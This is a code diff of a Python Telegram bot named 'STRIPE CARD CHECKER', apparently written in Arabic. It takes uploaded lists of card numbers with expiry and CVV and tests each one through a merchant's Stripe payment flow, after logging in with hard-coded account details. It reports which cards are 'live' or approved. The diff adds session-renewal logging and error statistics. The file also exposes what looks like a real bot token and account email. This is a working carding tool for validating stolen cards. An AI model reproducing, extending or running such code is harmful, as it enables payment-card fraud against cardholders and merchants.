@@ -12,8 +12,8 @@ from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== الإعدادات ==========
-BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"  # ضع توكن البوت هنا
-ADMIN_IDS = [5895491379]  # ضع ID التليجرام بتاعك
+BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
+ADMIN_IDS = [5895491379]
 
 INVOICE_ID = "260528"
 USERNAME = "renes98352@neuraxo.com"
@@ -39,7 +39,10 @@ stats = {
     'is_running': False,
     'dashboard_message_id': None,
     'chat_id': None,
-    'current_cards': [],  # البطاقات الحالية قيد الفحص
+    'current_cards': [],
+    'session_renewals': 0,
+    'last_renewal': None,
+    'error_details': {},
 }
 
 session_error_count = 0
@@ -49,6 +52,7 @@ session_lock = threading.Lock()
 def do_login():
     global cookies
     try:
+        print(f"🔄 محاولة تجديد الجلسة... ({datetime.now().strftime('%H:%M:%S')})")
         sess = requests.Session()
         sess.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
         
@@ -64,9 +68,14 @@ def do_login():
         
         if "clientarea.php" in login_resp.url:
             cookies.update(sess.cookies.get_dict())
+            stats['session_renewals'] += 1
+            stats['last_renewal'] = datetime.now()
+            print(f"✅ تم تجديد الجلسة بنجاح! (المرة #{stats['session_renewals']})")
             return True
+        print("❌ فشل تجديد الجلسة - لم يتم التوجيه لـ clientarea")
         return False
-    except:
+    except Exception as e:
+        print(f"❌ خطأ في تجديد الجلسة: {str(e)}")
         return False
 
 def get_session_data():
@@ -94,10 +103,13 @@ async def check_card(card, bot_app):
     
     parts = card.strip().split('|')
     if len(parts) != 4:
+        error_type = "FORMAT_ERROR"
         stats['errors'] += 1
+        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
         stats['checking'] -= 1
         await update_dashboard(bot_app)
-        return card, "FORMAT_ERROR", "❌ صيغة خاطئة"
+        print(f"❌ {card[:20]}... - صيغة خاطئة")
+        return card, error_type, "❌ صيغة خاطئة"
     
     cc, mm, yy, cvv = parts
     
@@ -105,15 +117,22 @@ async def check_card(card, bot_app):
     if not session_id:
         with session_lock:
             session_error_count += 1
+            print(f"⚠️ خطأ Session #{session_error_count} - محاولة التجديد...")
             if session_error_count >= 3:
-                do_login()
-                session_error_count = 0
+                if do_login():
+                    print("✅ تم تجديد الجلسة بنجاح")
+                    session_error_count = 0
+                else:
+                    print("❌ فشل تجديد الجلسة")
         
+        error_type = "SESSION_ERROR"
         stats['errors'] += 1
+        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
         stats['checking'] -= 1
         await update_dashboard(bot_app)
-        await send_result(bot_app, card, "SESSION_ERROR", "فشل جلب Session")
-        return card, "SESSION_ERROR", "فشل جلب Session"
+        await send_result(bot_app, card, error_type, "فشل جلب Session")
+        print(f"❌ {cc[:6]}****{cc[-4:]} - فشل جلب Session")
+        return card, error_type, "فشل جلب Session"
     
     headers_api = {
         'content-type': 'application/x-www-form-urlencoded',
@@ -143,18 +162,26 @@ async def check_card(card, bot_app):
         
         if 'error' in pm_res:
             error_msg = pm_res['error'].get('message', 'خطأ غير معروف')
+            error_code = pm_res['error'].get('code', 'unknown')
+            error_type = f"PM_{error_code}"
+            
             stats['declined'] += 1
+            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
             stats['checking'] -= 1
             await update_dashboard(bot_app)
             await send_result(bot_app, card, "DECLINED", error_msg)
+            print(f"❌ {cc[:6]}****{cc[-4:]} - {error_code}: {error_msg}")
             return card, "DECLINED", error_msg
         
         if 'id' not in pm_res:
+            error_type = "PM_ERROR"
             stats['errors'] += 1
+            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
             stats['checking'] -= 1
             await update_dashboard(bot_app)
-            await send_result(bot_app, card, "PM_ERROR", "فشل إنشاء Payment Method")
-            return card, "PM_ERROR", "فشل إنشاء PM"
+            await send_result(bot_app, card, error_type, "فشل إنشاء Payment Method")
+            print(f"⚠️ {cc[:6]}****{cc[-4:]} - فشل إنشاء Payment Method")
+            return card, error_type, "فشل إنشاء PM"
         
         pm_id = pm_res['id']
         confirm_data = f'payment_method={pm_id}&expected_amount=6800'
@@ -168,11 +195,16 @@ async def check_card(card, bot_app):
         confirm_res = r2.json()
         
         if 'payment_intent' not in confirm_res:
+            error_type = "PI_ERROR"
+            error_msg = confirm_res.get('error', {}).get('message', 'لا يوجد Payment Intent')
+            
             stats['errors'] += 1
+            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
             stats['checking'] -= 1
             await update_dashboard(bot_app)
-            await send_result(bot_app, card, "PI_ERROR", "لا يوجد Payment Intent")
-            return card, "PI_ERROR", "لا يوجد payment_intent"
+            await send_result(bot_app, card, error_type, error_msg)
+            print(f"⚠️ {cc[:6]}****{cc[-4:]} - {error_msg}")
+            return card, error_type, error_msg
         
         pi = confirm_res['payment_intent']
         status = pi.get('status')
@@ -182,6 +214,7 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             await update_dashboard(bot_app)
             await send_result(bot_app, card, "APPROVED", "Approved ✅")
+            print(f"✅ {cc[:6]}****{cc[-4:]} - Approved!")
             return card, "APPROVED", "Approved"
         
         if status == 'requires_action':
@@ -200,11 +233,15 @@ async def check_card(card, bot_app):
                     
                     if 'error' in tds_res:
                         error_msg = tds_res['error'].get('message', 'خطأ 3DS')
+                        error_type = "3DS_ERROR"
+                        
                         stats['declined'] += 1
+                        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
                         stats['checking'] -= 1
                         await update_dashboard(bot_app)
-                        await send_result(bot_app, card, "3DS_ERROR", error_msg)
-                        return card, "3DS_ERROR", error_msg
+                        await send_result(bot_app, card, error_type, error_msg)
+                        print(f"❌ {cc[:6]}****{cc[-4:]} - 3DS Error: {error_msg}")
+                        return card, error_type, error_msg
                     
                     trans = tds_res.get('ares', {}).get('transStatus') or tds_res.get('transStatus')
                     
@@ -213,35 +250,45 @@ async def check_card(card, bot_app):
                         stats['checking'] -= 1
                         await update_dashboard(bot_app)
                         await send_result(bot_app, card, "APPROVED", "Approved (3DS) ✅")
+                        print(f"✅ {cc[:6]}****{cc[-4:]} - Approved (3DS)!")
                         return card, "APPROVED", "Approved (3DS)"
                     elif trans == 'N':
                         stats['live'] += 1
                         stats['checking'] -= 1
                         await update_dashboard(bot_app)
                         await send_result(bot_app, card, "LIVE", "Live Card 🟢")
+                        print(f"🟢 {cc[:6]}****{cc[-4:]} - Live Card!")
                         return card, "LIVE", "Live"
                     else:
                         stats['declined'] += 1
+                        stats['error_details']['3DS_FAILED'] = stats['error_details'].get('3DS_FAILED', 0) + 1
                         stats['checking'] -= 1
                         await update_dashboard(bot_app)
                         await send_result(bot_app, card, "3DS_FAILED", f"3DS Status: {trans}")
+                        print(f"⚠️ {cc[:6]}****{cc[-4:]} - 3DS Status: {trans}")
                         return card, "3DS_FAILED", f"3DS: {trans}"
         
         error = pi.get('last_payment_error', {})
         error_msg = error.get('message', error.get('code', status)) if error else status
+        error_code = error.get('code', 'declined') if error else 'declined'
         
         stats['declined'] += 1
+        stats['error_details'][error_code] = stats['error_details'].get(error_code, 0) + 1
         stats['checking'] -= 1
         await update_dashboard(bot_app)
         await send_result(bot_app, card, "DECLINED", error_msg)
+        print(f"❌ {cc[:6]}****{cc[-4:]} - {error_code}: {error_msg}")
         return card, "DECLINED", error_msg
         
     except Exception as e:
+        error_type = "EXCEPTION"
         stats['errors'] += 1
+        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
         stats['checking'] -= 1
         await update_dashboard(bot_app)
-        await send_result(bot_app, card, "EXCEPTION", str(e))
-        return card, "EXCEPTION", str(e)
+        await send_result(bot_app, card, error_type, str(e))
+        print(f"💥 {cc[:6]}****{cc[-4:]} - Exception: {str(e)}")
+        return card, error_type, str(e)
 
 # ========== دالات البوت ==========
 async def send_result(bot_app, card, status_type, message):
@@ -249,7 +296,6 @@ async def send_result(bot_app, card, status_type, message):
     if not stats['chat_id']:
         return
     
-    # تحديد الإيموجي حسب النوع
     emoji_map = {
         'APPROVED': '✅',
         'LIVE': '🟢',
@@ -265,19 +311,16 @@ async def send_result(bot_app, card, status_type, message):
     
     emoji = emoji_map.get(status_type, '❓')
     
-    # تجهيز البطاقة
     parts = card.split('|')
     cc = parts[0] if len(parts) > 0 else "****"
     masked = f"{cc[:6]}******{cc[-4:]}"
     
-    # إنشاء الأزرار
     keyboard = [
         [InlineKeyboardButton(f"💳 {masked}", callback_data="card_info")],
         [InlineKeyboardButton(f"{emoji} {message[:35]}", callback_data="response_info")],
         [InlineKeyboardButton(f"⏰ {datetime.now().strftime('%H:%M:%S')}", callback_data="time_info")]
     ]
     
-    # إرسال رسالة منفصلة للبطاقات الناجحة فقط
     if status_type in ['APPROVED', 'LIVE']:
         try:
             await bot_app.bot.send_message(
@@ -298,7 +341,7 @@ def create_dashboard_keyboard():
     hours, mins = divmod(mins, 60)
     
     keyboard = [
-        [InlineKeyboardButton(f"📥 الإجمالي: {stats['total']}", callback_data="total")],
+        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
         [
             InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
             InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
@@ -310,17 +353,31 @@ def create_dashboard_keyboard():
         [
             InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"),
             InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
+        ],
+        [
+            InlineKeyboardButton(f"🔄 تجديدات الجلسة: {stats['session_renewals']}", callback_data="renewals")
         ]
     ]
+    
+    if stats['last_renewal']:
+        time_diff = (datetime.now() - stats['last_renewal']).seconds
+        keyboard.append([
+            InlineKeyboardButton(f"⏰ آخر تجديد: منذ {time_diff}ث", callback_data="last_renewal")
+        ])
     
     if stats['is_running']:
         keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
     
-    # إضافة البطاقات الحالية
     if stats['current_cards']:
         keyboard.append([InlineKeyboardButton("━━━ البطاقات الحالية ━━━", callback_data="separator")])
         for i, card_info in enumerate(stats['current_cards'][:3]):
             keyboard.append([InlineKeyboardButton(f"🔄 {card_info}", callback_data=f"card_{i}")])
+    
+    if stats['error_details']:
+        keyboard.append([InlineKeyboardButton("━━━ أكثر الأخطاء ━━━", callback_data="error_sep")])
+        sorted_errors = sorted(stats['error_details'].items(), key=lambda x: x[1], reverse=True)[:3]
+        for error_type, count in sorted_errors:
+            keyboard.append([InlineKeyboardButton(f"⚠️ {error_type}: {count}", callback_data=f"err_{error_type}")])
     
     return InlineKeyboardMarkup(keyboard)
 
@@ -331,7 +388,7 @@ async def update_dashboard(bot_app):
             await bot_app.bot.edit_message_text(
                 chat_id=stats['chat_id'],
                 message_id=stats['dashboard_message_id'],
-                text="🔰 **STRIPE CARD CHECKER** 🔰",
+                text="📊 **STRIPE CARD CHECKER** 📊",
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
@@ -343,9 +400,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ غير مصرح")
         return
     
-    keyboard = [[InlineKeyboardButton("📝 إرسال ملف البطاقات", callback_data="send_file")]]
+    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
-        "🔰 **STRIPE CARD CHECKER BOT**\n\n"
+        "📊 **STRIPE CARD CHECKER BOT**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
         "الصيغة: `رقم|شهر|سنة|cvv`",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -364,7 +421,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_content = await file.download_as_bytearray()
     cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
     
-    # إعادة تعيين
     stats['total'] = len(cards)
     stats['checking'] = 0
     stats['approved'] = 0
@@ -372,19 +428,20 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats['declined'] = 0
     stats['errors'] = 0
     stats['current_cards'] = []
+    stats['session_renewals'] = 0
+    stats['last_renewal'] = None
+    stats['error_details'] = {}
     stats['start_time'] = datetime.now()
     stats['is_running'] = True
     stats['chat_id'] = update.effective_chat.id
     
-    # Dashboard
     dashboard_msg = await update.message.reply_text(
-        "🔰 **STRIPE CARD CHECKER** 🔰",
+        "📊 **STRIPE CARD CHECKER** 📊",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
     stats['dashboard_message_id'] = dashboard_msg.message_id
     
-    # بدء الفحص
     def run_checker():
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
@@ -419,7 +476,8 @@ async def process_cards(cards, bot_app):
             [InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="final_approved")],
             [InlineKeyboardButton(f"🟢 Live: {stats['live']}", callback_data="final_live")],
             [InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="final_declined")],
-            [InlineKeyboardButton(f"📥 Total: {stats['total']}", callback_data="final_total")]
+            [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="final_total")],
+            [InlineKeyboardButton(f"🔄 تجديدات: {stats['session_renewals']}", callback_data="final_renewals")]
         ]
         await bot_app.bot.send_message(
             chat_id=stats['chat_id'],
